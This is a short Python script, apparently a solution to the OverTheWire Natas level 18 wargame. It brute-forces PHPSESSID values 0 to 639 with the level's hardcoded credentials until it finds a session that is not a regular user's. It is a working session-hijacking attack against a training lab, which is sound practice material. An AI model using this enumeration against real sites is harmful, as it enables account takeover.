import requests

def checkSession(sessid):
    print(f'Checking {sessid}')
    r = requests.get(
        'http://natas18.natas.labs.overthewire.org/index.php',
        auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
        cookies={'PHPSESSID': str(sessid)},
        params={'debug': 'true'}
    )
    if 'You are logged in as a regular user' in r.text:
        return False
    else:

        print(r.text)
        return True

for i in range(0, 640):
    if checkSession(i):
        break